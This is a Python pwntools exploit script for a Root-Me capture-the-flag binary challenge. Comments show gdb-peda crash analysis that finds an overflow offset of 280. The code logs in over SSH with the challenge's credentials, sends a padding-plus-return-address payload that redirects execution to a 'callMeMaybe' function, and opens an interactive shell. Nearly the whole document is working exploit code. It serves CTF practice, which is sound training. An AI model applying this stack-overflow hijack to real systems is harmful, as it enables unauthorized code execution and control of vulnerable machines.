# gdb-peda ./ch35
# pattern create 900
# x/xg $rsp
# Stopped reason: SIGSEGV
# 0x000000000040068e in main ()
# gdb-peda$ x/xg $rsp
# 0x7ffc4677ef48: 0x25416625414a2541
# gdb-peda$ pattern search 0x25416625414a2541
# Registers contain pattern buffer:
#     RBP+0 found at offset: 272
#     R8+60 found at offset: 60
#     Registers point to pattern buffer:
#         [RSP] --> offset 280 - size ~203
#         [R13] --> offset 496 - size ~203

# BOF at 280

from pwn import *
import struct

s = ssh(host='challenge02.root-me.org', user='app-systeme-ch35', password='app-systeme-ch35', port=2223)

p = s.process(['/challenge/app-systeme/ch35/ch35'])
elf = p.elf

shell_addr = hex(elf.symbols['callMeMaybe'])

payload = chr(0x41) * 280
payload += struct.pack("L", int(shell_addr, 16))
p.sendline(payload)

p.interactive()
